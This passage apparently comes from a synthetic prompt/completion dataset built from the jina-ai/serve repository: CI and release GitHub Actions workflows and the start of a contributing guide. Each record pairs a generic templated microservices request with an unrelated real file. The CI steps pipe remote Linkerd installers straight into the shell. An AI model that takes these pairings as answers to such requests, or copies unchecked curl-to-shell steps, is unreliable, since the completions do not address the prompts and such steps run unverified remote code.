--cov-report=xml ./tests/k8s/test_k8s_graceful_request_handling.py\n        timeout-minutes: 45\n      - name: Check codecov file\n        id: check_files\n        uses: andstor/file-existence-action@v1\n        with:\n          files: \"coverage.xml\"\n      - name: Upload coverage from test to Codecov\n        uses: codecov/codecov-action@v3.1.1\n        if: steps.check_files.outputs.files_exists == 'true' && ${{ matrix.python-version }} == '3.10'\n        with:\n          file: coverage.xml\n          name: ${{ matrix.test-path }}-codecov\n          flags: ${{ steps.test.outputs.codecov_flag }}\n          fail_ci_if_error: false\n\n  k8s-failures-test:\n    needs: [ lint-flake-8, code-injection ]\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v2.5.0\n      - name: Set up Python 3.10\n        uses: actions/setup-python@v4\n        with:\n          python-version: 3.8\n      - name: Prepare enviroment\n        run: |\n          docker build --build-arg DOCARRAY_VERSION=\"0.21.0\" --build-arg PYDANTIC_VERSION=\"==1.10.3\" -f Dockerfiles/test-pip.Dockerfile -t jinaai/jina:test-pip .\n          python -m pip install --upgrade pip\n          python -m pip install wheel\n          pip install \".[all]\" --no-cache-dir\n          pip install docarray==0.21.0\n          pip install pydantic==1.10.3\n          jina\n          export JINA_LOG_LEVEL=\"ERROR\"\n          curl -LO https://dl.k8s.io/release/v1.21.1/bin/linux/amd64/kubectl\n          sudo install -o root -g root -m 0755 kubectl /usr/local/bin/kubectl\n        env:\n          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n      - name: Test k8s failures\n        run: |\n          export LINKERD2_VERSION=stable-2.11.4\n          curl --proto '=https' --tlsv1.2 -sSfL https://run.linkerd.io/install | sh\n          curl --proto '=https' --tlsv1.2 -sSfL https://linkerd.github.io/linkerd-smi/install | sh\n          pytest -v -s --suppress-no-test-exit-code --force-flaky --min-passes 1 --max-runs 5 --cov=jina --cov-report=xml ./tests/k8s/test_k8s_failures.py\n        timeout-minutes: 45\n      - name: Check codecov file\n        id: check_files\n        uses: andstor/file-existence-action@v1\n        with:\n          files: \"coverage.xml\"\n      - name: Upload coverage from test to Codecov\n        uses: codecov/codecov-action@v3.1.1\n        if: steps.check_files.outputs.files_exists == 'true' && ${{ matrix.python-version }} == '3.10'\n        with:\n          file: coverage.xml\n          name: ${{ matrix.test-path }}-codecov\n          flags: ${{ steps.test.outputs.codecov_flag }}\n          fail_ci_if_error: false\n\n  k8s-otel-test:\n    needs: [lint-flake-8, code-injection]\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v2.5.0\n      - name: Set up Python 3.10\n        uses: actions/setup-python@v4\n        with:\n          python-version: \"3.10\"\n      - name: Prepare enviroment\n        run: |\n          docker build --build-arg DOCARRAY_VERSION=\"0.21.0\" --build-arg PYDANTIC_VERSION=\"==1.10.3\" -f Dockerfiles/test-pip.Dockerfile -t jinaai/jina:test-pip .\n          python -m pip install --upgrade pip\n          python -m pip install wheel\n          pip install \".[all]\" --no-cache-dir\n          pip install docarray==0.21.0\n          pip install pydantic==1.10.3\n          jina\n          export JINA_LOG_LEVEL=\"ERROR\"\n          curl -LO https://dl.k8s.io/release/v1.21.1/bin/linux/amd64/kubectl\n          sudo install -o root -g root -m 0755 kubectl /usr/local/bin/kubectl\n        env:\n          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n      - name: Test K8s with OpenTelemetry\n        run: |\n          pytest -v -s --cov=jina --cov-report=xml ./tests/k8s_otel\n        timeout-minutes: 30\n      - name: Check codecov file\n        id: check_files\n        uses: andstor/file-existence-action@v1\n        with:\n          files: \"coverage.xml\"\n      - name: Upload coverage from test to Codecov\n        uses: codecov/codecov-action@v3.1.1\n        if: steps.check_files.outputs.files_exists == 'true' && ${{ matrix.python-version }} == '3.10'\n        with:\n          file: coverage.xml\n          name: ${{ matrix.test-path }}-codecov\n          flags: ${{ steps.test.outputs.codecov_flag }}\n          fail_ci_if_error: false\n\n\n  docker-compose-test:\n    needs: [lint-flake-8, code-injection]\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v2.5.0\n      - name: Set up Python 3.10\n        uses: actions/setup-python@v4\n        with:\n          python-version: \"3.10\"\n      - name: Prepare enviroment\n        run: |\n          docker build --build-arg DOCARRAY_VERSION=\"0.21.0\" --build-arg PYDANTIC_VERSION=\"==1.10.3\" -f Dockerfiles/test-pip.Dockerfile -t jinaai/jina:test-pip .\n          python -m pip install --upgrade pip\n          python -m pip install wheel\n          pip install \".[all]\" --no-cache-dir\n          pip install docarray==0.21.0\n          pip install pydantic==1.10.3\n          jina\n          export JINA_LOG_LEVEL=\"ERROR\"\n        env:\n          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n      - name: Test docker compose\n        run: |\n          pytest -v -s --suppress-no-test-exit-code --force-flaky --min-passes 1 --max-runs 5 --cov=jina --cov-report=xml ./tests/docker_compose/test_*.py\n        timeout-minutes: 30\n      - name: Check codecov file\n        id: check_files\n        uses: andstor/file-existence-action@v1\n        with:\n          files: \"coverage.xml\"\n      - name: Upload coverage from test to Codecov\n        uses: codecov/codecov-action@v3.1.1\n        if: steps.check_files.outputs.files_exists == 'true' && ${{ matrix.python-version }} == '3.10'\n        with:\n          file: coverage.xml\n          name: ${{ matrix.test-path }}-codecov\n          flags: ${{ steps.test.outputs.codecov_flag }}\n          fail_ci_if_error: false\n\n  prep-testbed:\n    runs-on: ubuntu-latest\n    needs: [ lint-flake-8, code-injection]\n    steps:\n      - uses: actions/checkout@v2.5.0\n      - id: set-matrix\n        run: |\n          sudo apt-get install jq\n          export value=$(bash scripts/get-all-test-paths.sh)\n          echo \"matrix=$value\" >> $GITHUB_OUTPUT\n    outputs:\n      matrix: ${{ steps.set-matrix.outputs.matrix }}\n\n  docarray-v-two-test:\n    needs: prep-testbed\n    runs-on: ubuntu-latest\n    env:\n      JINA_RANDOM_PORT_MIN: 16384\n    strategy:\n      fail-fast: false\n      matrix:\n        python-version: [\"3.10\"]\n        protobuf-version: ['==3.19.6', '']\n        pydantic-version: ['==1.10.3', '<3.0.0']\n    steps:\n      - uses: actions/checkout@v2.5.0\n      - name: Set up Python ${{ matrix.python-version }}\n        uses: actions/setup-python@v4\n        with:\n          python-version: ${{ matrix.python-version }}\n      - name: Set up Golang\n        uses: actions/setup-go@v2\n        with:\n          go-version: 1.19.5\n\n      - name: Install dependencies\n        run: |\n          python -m pip install --upgrade pip\n          pip install setuptools wheel\n          pip install git+https://github.com/jina-ai/setuptools-golang.git@feat-align-with-alaeddine-code\n          pip install cibuildwheel\n\n      - name: Build wheels with setuptools-golang-build-manylinux-wheel\n        run: |\n          setuptools-golang-build-manylinux-wheels --pythons cp310-cp310\n      - name: Prepare environment\n        run: |\n          # Take into account in the `test-pip` the versions\n          docker build --build-arg PYDANTIC_VERSION=\"${{ matrix.pydantic-version }}\" -f Dockerfiles/test-pip.Dockerfile -t jinaai/jina:test-pip .\n          python -m pip install --upgrade pip\n          python -m pip install wheel\n          WHEEL_FILE=$(ls dist/*whl)\n          pip install \"$WHEEL_FILE[common,devel,test]\" --no-cache-dir\n          if [[ \"${{ matrix.protobuf-version }}\" == \"==3.19.6\" ]]; then\n            pip install -U protobuf${{ matrix.protobuf-version }} grpcio==1.47.5 grpcio-reflection==1.47.5 grpcio-health-checking==1.47.5\n          else\n            pip install -U protobuf${{ matrix.protobuf-version }} grpcio==1.65.5 grpcio-reflection==1.65.5 grpcio-health-checking==1.65.5\n          fi\n          pip install pydantic\"${{ matrix.pydantic-version }}\"\n          jina\n          export JINA_LOG_LEVEL=\"ERROR\"\n      - name: Test\n        id: test\n        run: |\n          pytest --suppress-no-test-exit-code --force-flaky --min-passes 1 --max-runs 5 --cov=jina --cov-report=xml --timeout=600 -v -s --ignore-glob='tests/integration/hub_usage/dummyhub*' tests/unit/serve/runtimes/test_helper.py\n          pytest --suppress-no-test-exit-code --force-flaky --min-passes 1 --max-runs 5 --cov=jina --cov-report=xml --timeout=600 -v -s --ignore-glob='tests/integration/hub_usage/dummyhub*' tests/integration/deployment_http_composite\n          pytest --suppress-no-test-exit-code --force-flaky --min-passes 1 --max-runs 5 --cov=jina --cov-report=xml --timeout=600 -v -s --ignore-glob='tests/integration/hub_usage/dummyhub*' tests/integration/docarray_v2/test_singleton.py\n          pytest --suppress-no-test-exit-code --force-flaky --min-passes 1 --max-runs 5 --cov=jina --cov-report=xml --timeout=600 -v -s --ignore-glob='tests/integration/hub_usage/dummyhub*' tests/integration/docarray_v2/test_parameters_as_pydantic.py\n          pytest --suppress-no-test-exit-code --force-flaky --min-passes 1 --max-runs 5 --cov=jina --cov-report=xml --timeout=600 -v -s --ignore-glob='tests/integration/hub_usage/dummyhub*' tests/integration/docarray_v2/test_streaming.py\n          pytest --suppress-no-test-exit-code --force-flaky --min-passes 1 --max-runs 5 --cov=jina --cov-report=xml --timeout=600 -v -s --ignore-glob='tests/integration/hub_usage/dummyhub*' tests/integration/docarray_v2/csp\n          pytest --suppress-no-test-exit-code --force-flaky --min-passes 1 --max-runs 5 --cov=jina --cov-report=xml --timeout=600 -v -s --ignore-glob='tests/integration/hub_usage/dummyhub*' tests/integration/docarray_v2/docker\n          pytest --suppress-no-test-exit-code --force-flaky --min-passes 1 --max-runs 5 --cov=jina --cov-report=xml --timeout=600 -v -s --ignore-glob='tests/integration/hub_usage/dummyhub*' tests/integration/docarray_v2/test_v2.py\n          pytest --suppress-no-test-exit-code --force-flaky --min-passes 1 --max-runs 5 --cov=jina --cov-report=xml --timeout=600 -v -s --ignore-glob='tests/integration/hub_usage/dummyhub*' tests/integration/docarray_v2/test_errors.py\n          echo \"flag it as jina for codeoverage\"\n          echo \"codecov_flag=jina\" >> $GITHUB_OUTPUT\n        timeout-minutes: 60\n        env:\n          JINA_AUTH_TOKEN: \"${{ secrets.JINA_AUTH_TOKEN }}\"\n      - name: Check codecov file\n        id: check_files\n        uses: andstor/file-existence-action@v1\n        with:\n          files: \"coverage.xml\"\n      - name: Upload coverage from test to Codecov\n        uses: codecov/codecov-action@v3.1.1\n        if: steps.check_files.outputs.files_exists == 'true' && ${{ matrix.python-version }} == '3.10'\n        with:\n          file: coverage.xml\n          name: ${{ matrix.test-path }}-codecov\n          flags: ${{ steps.test.outputs.codecov_flag }}\n          fail_ci_if_error: false\n\n\n  stateful-docarray-v-two-test:\n    needs: prep-testbed\n    runs-on: ubuntu-latest\n    env:\n      JINA_RANDOM_PORT_MIN: 16384\n    strategy:\n      fail-fast: false\n      matrix:\n        python-version: [\"3.10\"]\n        protobuf-version: ['==3.19.6', '']\n        pydantic-version: ['==1.10.3', '<3.0.0']\n    steps:\n      - uses: actions/checkout@v2.5.0\n      - name: Set up Python ${{ matrix.python-version }}\n        uses: actions/setup-python@v4\n        with:\n          python-version: ${{ matrix.python-version }}\n      - name: Set up Golang\n        uses: actions/setup-go@v2\n        with:\n          go-version: 1.19.5\n\n      - name: Install dependencies\n        run: |\n          python -m pip install --upgrade pip\n          pip install setuptools wheel\n          pip install git+https://github.com/jina-ai/setuptools-golang.git@feat-align-with-alaeddine-code\n          pip install cibuildwheel\n\n      - name: Build wheels with setuptools-golang-build-manylinux-wheel\n        run: |\n          setuptools-golang-build-manylinux-wheels --pythons cp310-cp310\n      - name: Prepare environment\n        run: |\n          # Take into account in the `test-pip` the versions\n          docker build --build-arg PYDANTIC_VERSION=\"${{ matrix.pydantic-version }}\" -f Dockerfiles/test-pip.Dockerfile -t jinaai/jina:test-pip .\n          python -m pip install --upgrade pip\n          python -m pip install wheel\n          WHEEL_FILE=$(ls dist/*whl)\n          pip install \"$WHEEL_FILE[common,devel,test]\" --no-cache-dir\n          if [[ \"${{ matrix.protobuf-version }}\" == \"==3.19.6\" ]]; then\n            pip install -U protobuf${{ matrix.protobuf-version }} grpcio==1.47.5 grpcio-reflection==1.47.5 grpcio-health-checking==1.47.5\n          else\n            pip install -U protobuf${{ matrix.protobuf-version }} grpcio==1.65.5 grpcio-reflection==1.65.5 grpcio-health-checking==1.65.5\n          fi\n          pip install pydantic\"${{ matrix.pydantic-version }}\"\n          jina\n          export JINA_LOG_LEVEL=\"ERROR\"\n      - name: Test stateful\n        id: test_stateful\n        run: |\n          JINA_LOG_LEVEL=DEBUG JINA_RANDOM_PORT_MAX=\"60535\" pytest --suppress-no-test-exit-code --maxfail 1 --force-flaky --min-passes 1 --max-runs 5 --cov=jina --cov-report=xml --timeout=600 -v -s --ignore-glob='tests/integration/hub_usage/dummyhub*' tests/integration/stateful\n          echo \"flag it as jina for codeoverage\"\n          echo \"codecov_flag=jina\" >> $GITHUB_OUTPUT\n        timeout-minutes: 30\n        env:\n          JINA_AUTH_TOKEN: \"${{ secrets.JINA_AUTH_TOKEN }}\"\n      - name: Check codecov file\n        id: check_files\n        uses: andstor/file-existence-action@v1\n        with:\n          files: \"coverage.xml\"\n      - name: Upload coverage from test to Codecov\n        uses: codecov/codecov-action@v3.1.1\n        if: steps.check_files.outputs.files_exists == 'true' && ${{ matrix.python-version }} == '3.10'\n        with:\n          file: coverage.xml\n          name: ${{ matrix.test-path }}-codecov\n          flags: ${{ steps.test.outputs.codecov_flag }}\n          fail_ci_if_error: false\n\n  # Build the wheels for Linux and macOS for Python 3.8 and newer\n  build-wheels:\n    runs-on: ${{ matrix.os }}\n    strategy:\n      # Ensure that a wheel builder finishes even if another fails\n      fail-fast: false\n      matrix:\n        include:\n          # linux\n          - os: ubuntu-latest\n            python: '3.8'\n            python-manylinux-tag: \"cp38-cp38\"\n          - os: ubuntu-latest\n            python: '3.9'\n            python-manylinux-tag: \"cp39-cp39\"\n          - os: ubuntu-latest\n            python: '3.10'\n            python-manylinux-tag: \"cp310-cp310\"\n          - os: ubuntu-latest\n            python: '3.11'\n            python-manylinux-tag: \"cp311-cp311\"\n\n          # MacOS emulated\n          - os: macos-latest\n            python: '3.8'\n            python-cibuildwheels: '38'\n            platform_id: macosx_x86_64\n            arch: x86_64\n            goarch: amd64\n          - os: macos-latest\n            python: '3.9'\n            python-cibuildwheels: '39'\n            platform_id: macosx_x86_64\n            arch: x86_64\n            goarch: amd64\n          - os: macos-latest\n            python: '3.10'\n            python-cibuildwheels: '310'\n            platform_id: macosx_x86_64\n            arch: x86_64\n            goarch: amd64\n          - os: macos-latest\n            python: '3.11'\n            python-cibuildwheels: '311'\n            platform_id: macosx_x86_64\n            arch: x86_64\n            goarch: amd64\n\n          # MacOS native\n          - os: macos-latest\n            python: '3.8'\n            python-cibuildwheels: '38'\n            platform_id: macosx_arm64\n            arch: arm64\n            goarch: arm64\n          - os: macos-latest\n            python: '3.9'\n            python-cibuildwheels: '39'\n            platform_id: macosx_arm64\n            arch: arm64\n            goarch: arm64\n          - os: macos-latest\n            python: '3.10'\n            python-cibuildwheels: '310'\n            platform_id: macosx_arm64\n            arch: arm64\n            goarch: arm64\n          - os: macos-latest\n            python: '3.11'\n            python-cibuildwheels: '311'\n            platform_id: macosx_arm64\n            arch: arm64\n            goarch: arm64\n\n    steps:\n      - name: Check out repository\n        uses: actions/checkout@v2.5.0\n\n      - name: Set up Python ${{ matrix.python }}\n        uses: actions/setup-python@v2\n        with:\n          python-version: ${{ matrix.python }}\n\n      - name: Set up Golang\n        uses: actions/setup-go@v2\n        with:\n          go-version: 1.19.5\n\n      - name: Install dependencies\n        run: |\n          python -m pip install --upgrade pip\n          pip install setuptools wheel\n          pip install git+https://github.com/jina-ai/setuptools-golang.git@feat-align-with-alaeddine-code\n          pip install cibuildwheel\n\n      - name: Build wheels with setuptools-golang-build-manylinux-wheel\n        if: ${{ matrix.os == 'ubuntu-latest' }}\n        run: |\n          setuptools-golang-build-manylinux-wheels --pythons ${{ matrix.python-manylinux-tag }}\n\n      - name: Build wheels with cibuildwheels on macos\n        env:\n          CIBW_BUILD: cp${{ matrix.python-cibuildwheels }}-${{ matrix.platform_id }}\n          CIBW_ARCHS: ${{ matrix.arch }}\n          CIBW_TEST_COMMAND: python -c \"import jina; import jraft\"\n          CIBW_BUILD_VERBOSITY: 1\n          GOARCH: ${{ matrix.goarch }}\n          CGO_ENABLED: 1\n        if: ${{ matrix.os == 'macos-latest' }}\n        run: |\n          python -m cibuildwheel --output-dir dist\n\n      - name: Upload wheels as artifacts\n        uses: actions/upload-artifact@v4\n        with:\n          name: artifacts-${{ strategy.job-index }}\n          path: dist/*.whl\n\n  core-test:\n    needs: [prep-testbed]\n    runs-on: ubuntu-latest\n    env:\n      JINA_RANDOM_PORT_MIN: 16384\n    strategy:\n      fail-fast: false\n      matrix:\n        python-version: [\"3.10\"]\n        test-path: ${{fromJson(needs.prep-testbed.outputs.matrix)}}\n    steps:\n      - uses: actions/checkout@v2.5.0\n      - name: Set up Python ${{ matrix.python-version }}\n        uses: actions/setup-python@v4\n        with:\n          python-version: ${{ matrix.python-version }}\n      - name: Set up Golang\n        uses: actions/setup-go@v2\n        with:\n          go-version: 1.19.5\n\n      - name: Install dependencies\n        run: |\n          python -m pip install --upgrade pip\n          pip install setuptools wheel\n          pip install git+https://github.com/jina-ai/setuptools-golang.git@feat-align-with-alaeddine-code\n          pip install cibuildwheel\n\n      - name: Build wheels with setuptools-golang-build-manylinux-wheel\n        run: |\n          setuptools-golang-build-manylinux-wheels --pythons cp310-cp310\n      - name: Prepare environment\n        run: |\n          docker build --build-arg DOCARRAY_VERSION=\"0.21.0\" --build-arg PYDANTIC_VERSION=\"==1.10.3\" -f Dockerfiles/test-pip.Dockerfile -t jinaai/jina:test-pip .\n          python -m pip install --upgrade pip\n          python -m pip install wheel\n          WHEEL_FILE=$(ls dist/*whl)\n          pip install \"$WHEEL_FILE[all]\" --no-cache-dir\n          pip install docarray==0.21.0\n          pip install pydantic==1.10.3\n          pip install grpcio==1.65.5 grpcio-reflection==1.65.5 grpcio-health-checking==1.65.5\n          jina\n          export JINA_LOG_LEVEL=\"ERROR\"\n      - name: Test\n        id: test\n        run: |\n          pytest --suppress-no-test-exit-code --force-flaky --min-passes 1 --max-runs 5 --cov=jina --cov-report=xml --timeout=600 -v -s --ignore-glob='tests/integration/docarray_v2/*' --ignore-glob='tests/integration/stateful/*' --ignore-glob='tests/integration/hub_usage/dummyhub*' ${{ matrix.test-path }}\n          if [[ \"${{ matrix.test-path }}\" == *\"tests/integration/instrumentation/\" ]]\n          then\n            echo \"sleeping to let open telemetry export daemon thread expire by itself\"\n            sleep 2\n          fi\n          echo \"flag it as jina for codeoverage\"\n          echo \"codecov_flag=jina\" >> $GITHUB_OUTPUT\n        timeout-minutes: 30\n        env:\n          JINA_AUTH_TOKEN: \"${{ secrets.JINA_AUTH_TOKEN }}\"\n      - name: Check codecov file\n        id: check_files\n        uses: andstor/file-existence-action@v1\n        with:\n          files: \"coverage.xml\"\n      - name: Upload coverage from test to Codecov\n        uses: codecov/codecov-action@v3.1.1\n        if: steps.check_files.outputs.files_exists == 'true' && ${{ matrix.python-version }} == '3.10'\n        with:\n          file: coverage.xml\n          name: ${{ matrix.test-path }}-codecov\n          flags: ${{ steps.test.outputs.codecov_flag }}\n          fail_ci_if_error: false\n\n  import-test:\n    runs-on: ubuntu-latest\n    needs: [lint-flake-8, code-injection ]\n    strategy:\n      fail-fast: false\n      matrix:\n        core: ['', 'true']\n        perf: ['', 'true']\n        python-version: [\"3.8\", \"3.9\", \"3.10\", \"3.11\"]\n        exclude:\n          - core: 'true'\n            perf: 'true'\n    steps:\n      - uses: actions/checkout@v2.5.0\n      - name: Set up Python ${{ matrix.python-version }}\n        uses: actions/setup-python@v4\n        with:\n          python-version: ${{ matrix.python-version }}\n      - name: Prepare enviroment\n        run: |\n          python -m pip install --upgrade pip\n          python -m pip install wheel\n          pip install --no-cache-dir .\n          pip list\n        env:\n          JINA_PIP_INSTALL_CORE: ${{ matrix.core }}\n          JINA_PIP_INSTALL_PERF: ${{ matrix.perf }}\n      - name: Test basic import\n        run: python -c 'from jina import Executor,requests,Client,Flow,dynamic_batching,Document,DocumentArray'\n      - name: Test import all\n        run: python -c 'from jina import *'\n\n  install-jina-ecosystem-test:\n    runs-on: ubuntu-latest\n    needs: [lint-flake-8, code-injection ]\n    strategy:\n      fail-fast: false\n    steps:\n      - uses: actions/checkout@v2.5.0\n      - name: Set up Python 3.10\n        uses: actions/setup-python@v4\n        with:\n          python-version: \"3.10\"\n      - name: Prepare enviroment\n        run: |\n          python -m pip install --upgrade pip\n          python -m pip install wheel\n\n          HUBBLE_VERSION=$(curl -L -s \"https://pypi.org/pypi/jina-hubble-sdk/json\" |  jq  -r '.releases | keys | .[]| select(startswith(\"0.\"))'  | sort -V | tail -1)\n          DOCARRAY_VERSION=$(curl -L -s \"https://pypi.org/pypi/docarray/json\" |  jq  -r '.releases | keys | .[]| select(startswith(\"0.\"))'  | sort -V | tail -1)\n          JCLOUD_VERSION=$(curl -L -s \"https://pypi.org/pypi/jcloud/json\" |  jq  -r '.releases | keys | .[]| select(startswith(\"0.\"))'  | sort -V | tail -1)\n\n          pip install . jcloud==$JCLOUD_VERSION docarray==$DOCARRAY_VERSION jina-hubble-sdk==$HUBBLE_VERSION\n        env:\n          JINA_PIP_INSTALL_CORE: ${{ matrix.core }}\n          JINA_PIP_INSTALL_PERF: ${{ matrix.perf }}\n\n      - name: Test basic import\n        run: python -c 'from jina import Executor,requests'\n      - name: Test import all\n        run: python -c 'from jina import *'\n\n\n  # just for blocking the merge until all parallel core-test are successful\n  success-all-test:\n    runs-on: ubuntu-latest\n    needs: [commit-lint, core-test, docarray-v-two-test, stateful-docarray-v-two-test, import-test, k8s-flow-test, k8s-deployment-test, k8s-graceful-test, k8s-failures-test, k8s-otel-test, docker-compose-test, docker-image-test, check-docstring, check-black, code-injection, build-wheels]\n\n    if: always()\n    steps:\n      - uses: technote-space/workflow-conclusion-action@v2\n      - name: Check Failure\n        if: env.WORKFLOW_CONCLUSION == 'failure'\n        run: exit 1\n      - name: Success\n        if: ${{ success() }}\n        run: echo \"All Done\"\n", "metadata": {"source": "github.com/jina-ai/serve", "file_path": ".github/workflows/ci.yml", "language": "yaml", "complexity": "complex", "star_count": 21665, "quality_score": 0.9500000000000001, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": true, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": true, "has_containers": true, "has_diagrams": false, "line_count": 835}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design microservices architecture with service communication patterns with containerized deployment\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "name: Release CD\n\non:\n  push:\n    tags:\n      - \"v*\"  # push to version tags trigger the build\n\n#on:\n#  push:\n#    branches-ignore:\n#      - '**'  # temporally disable this action\n\njobs:\n  update-schema:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v2.5.0\n      - uses: actions/checkout@v2.5.0\n        with:\n          repository: jina-ai/api\n          path: schema\n          token: ${{ secrets.JINA_DEV_BOT }}\n      - uses: actions/setup-python@v4\n        with:\n          python-version: 3.7\n      - uses: actions/setup-node@v2\n        with:\n          node-version: '14'\n      - run: |\n          JINA_VERSION=${GITHUB_REF/refs\\/tags\\/v/}\n          JINA_MINOR_VERSION=${JINA_VERSION%.*}\n          V_JINA_VERSION=${GITHUB_REF/refs\\/tags\\//}\n          echo \"JINA_VERSION=${JINA_VERSION}\" >> $GITHUB_ENV\n          echo \"V_JINA_VERSION=${V_JINA_VERSION}\" >> $GITHUB_ENV\n          echo \"JINA_MINOR_VERSION=${JINA_MINOR_VERSION}\" >> $GITHUB_ENV\n          pip install . --no-cache-dir\n          cd schema\n          mkdir -p schemas\n          jina export schema --schema-path schemas/\"$JINA_VERSION.json\" schemas/latest.json schemas/latest --yaml-path \"$JINA_VERSION.yml\" latest.yml --json-path \"$JINA_VERSION.json\" latest.json latest\n          python ../scripts/get-openapi-schemas.py\n          npm install --prefix ~ snippet-enricher-cli\n          ~/node_modules/.bin/snippet-enricher-cli --input=gateway.json --targets=shell_curl > gateway-with-code.json\n          cd -\n      - name: redoc-cli-gateway\n        uses: seeebiii/redoc-cli-github-action@v10\n        with:\n          args: 'bundle schema/gateway-with-code.json -o rest.html'\n      - name: push-to-api-repo\n        run: |\n          mkdir -p schema/rest/\n          cp rest.html schema/rest/index.html\n          cp rest.html schema/rest/${{env.JINA_VERSION}}.html\n          cp rest.html schema/rest/latest.html\n          cp schema/gateway.json schema/rest/${{env.JINA_VERSION}}.json\n          cp schema/gateway.json schema/rest/latest.json\n          rm schema/gateway.json schema/gateway-with-code.json\n          cd schema\n          git config --local user.email \"dev-bot@jina.ai\"\n          git config --local user.name \"Jina Dev Bot\"\n          git add . && git commit -m \"update ${{env.JINA_VERSION}} due to ${{github.event_name}} on ${{github.repository}}\" && git push\n\n  update-doc:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: benc-uk/workflow-dispatch@v1\n        with:\n          workflow: Manual Docs Build\n          token: ${{ secrets.JINA_DEV_BOT }}\n          inputs: '{ \"release_token\": \"${{ env.release_token }}\", \"triggered_by\": \"TAG\", \"build_old_docs\": \"TRUE\"}'\n        env:\n          release_token: ${{ secrets.JINA_CORE_RELEASE_TOKEN }}\n\n  update-docker:\n    needs: update-doc\n    runs-on: ubuntu-latest\n    steps:\n      - uses: benc-uk/workflow-dispatch@v1\n        with:\n          workflow: Manual Docker Build\n          token: ${{ secrets.JINA_DEV_BOT }}\n          inputs: '{ \"release_token\": \"${{ env.release_token }}\", \"triggered_by\": \"TAG\"}'\n        env:\n          release_token: ${{ secrets.JINA_CORE_RELEASE_TOKEN }}\n\n  create-release:\n    needs: update-doc\n    runs-on: ubuntu-latest\n    steps:\n      - name: Checkout code\n        uses: actions/checkout@v2.5.0\n        with:\n          ref: 'master'\n      - uses: actions/setup-python@v4\n        with:\n          python-version: 3.7\n      - run: |\n          python scripts/get-last-release-note.py\n      - name: Create Release\n        id: create_release\n        uses: actions/create-release@v1\n        env:\n          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }} # This token is provided by Actions, you do not need to create your own token\n        with:\n          tag_name: ${{ github.ref }}\n          release_name: 💫 Patch ${{ github.ref }}\n          body_path: 'tmp.md'\n          draft: false\n          prerelease: false\n", "metadata": {"source": "github.com/jina-ai/serve", "file_path": ".github/workflows/tag.yml", "language": "yaml", "complexity": "medium", "star_count": 21665, "quality_score": 0.8300000000000001, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": true, "has_database_design": false, "has_security": true, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": true, "has_diagrams": false, "line_count": 109}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design microservices architecture with service communication patterns with containerized deployment\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "> The best way to know more about contributing and how to get started is to **[join us on Discord](https://discord.jina.ai)** and ask questions in our public channels.\n\n# Contributing to Jina\n\nThanks for your interest in contributing to Jina. We're grateful for your initiative! ❤️\n\nIn this guide, we're going to go through the steps for each kind of contribution, and good and bad examples of what to do. We look forward to your contributions!\n\n<!-- START doctoc generated TOC please keep comment here to allow auto update -->\n<!-- DON'T EDIT THIS SECTION, INSTEAD RE-RUN doctoc TO UPDATE -->\n\n- [🐞 Bugs and Issues](#-bugs-and-issues)\n- [🥇 Making Your First Submission](#-making-your-first-submission)\n- [☑️ Naming Conventions](#-naming-conventions)\n- [💥 Testing Jina Locally and on CI](#-testing-jina-locally-and-on-ci)\n- [📖 Contributing Documentation](#-contributing-documentation)\n- [🙏 Thank You](#-thank-you)\n\n<!-- END doctoc generated TOC please keep comment here to allow auto update -->\n\n<a name=\"-bugs-and-issues\"></a>\n## 🐞 Bugs and Issues\n\n### Submitting Issues\n\nWe love to get issue reports. But we love it even more if they're in the right format. For any bugs you encounter, we need you to:\n\n* **Describe your problem**: What exactly is the bug. Be as clear and concise as possible\n* **Why do you think it's happening?** If you have any insight, here's where to share it\n\nThere are also a couple of nice to haves:\n\n* **Environment:** You can find this with ``jina -vf``\n* **Screenshots:** If they're relevant\n\n<a name=\"-making-your-first-submission\"></a>\n## 🥇 Making Your First Submission\n\n0. Associate your local git config with your GitHub account. If this is your first time using git you can follow [the steps](#associate-with-github-account).\n1. Fork the Jina repo and clone onto your computer. \n1. Configure git pre-commit hooks. Please follow [the steps](#install-pre-commit-hooks)\n1. Create a [new branch](#naming-your-branch), for example `fix-jina-typo-1`.\n1. Work on this branch to do the fix/improvement.\n1. Check if your code changes follow the [code review guidelines](.github/CODE_REVIEW_GUIDELINES.md).\n1. Commit the changes with the [correct commit style](#writing-your-commit-message).\n1. Make a pull request.\n1. Submit your pull request and wait for all checks to pass.\n1. Request reviews from one of [the code owners](.github/CODEOWNERS).\n1. Get a LGTM 👍 and PR gets merged.\n\n**Note:** If you're just fixing a typo or grammatical issue, you can go straight to a pull request.\n\n### Associate with GitHub Account\n\n- Confirm username and email on [your profile page](https://github.com/settings/profile).\n- Set git config on your computer.\n\n```shell\ngit config user.name \"YOUR GITHUB NAME\"\ngit config user.email \"YOUR GITHUB EMAIL\"\n```\n\n- (Optional) Reset the commit author if you made commits before you set the git config.\n\n```shell\ngit checkout YOUR-WORKED-BRANCH\ngit commit --amend --author=\"YOUR-GITHUB-NAME <YOUR-GITHUB-EMAIL>\" --no-edit\ngit log  # to confirm the change is effective\ngit push --force\n```\n\nWhat happens after the merge? [Understand the development stage and release cycles here.](RELEASE.md)\n\n### Install pre-commit 